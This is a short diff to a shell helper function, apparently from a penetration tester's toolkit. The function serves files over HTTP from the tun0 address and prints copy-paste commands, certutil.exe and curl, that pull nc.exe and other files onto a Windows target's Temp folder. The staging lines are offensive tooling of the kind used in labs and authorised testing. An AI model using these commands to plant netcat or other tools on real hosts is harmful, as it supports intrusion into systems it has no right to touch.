@@ -122,6 +122,14 @@ http_server() {
     local LHOST=$(ip a show tun0 | grep 'inet ' | awk '{ print substr($2, 0, length($2)-3) }')
     local LPORT="${1:-8080}"
     l && ip -br a && echo "certutil.exe -urlcache -f http://$LHOST:$LPORT/nc.exe C:\\Windows\\Temp\\nc.exe"
+
+    # pop argv[0] and LPORT:
+    set -- "${@:2:$#-1}"
+    # copy-paste friendly
+    for optfile in "$@"; do
+      echo "curl http://$LHOST:$LPORT/$optfile -o C:\\Windows\\Temp\\$(basename -- $optfile)"
+    done
+
     python3 -m http.server "$LPORT"
 }
 
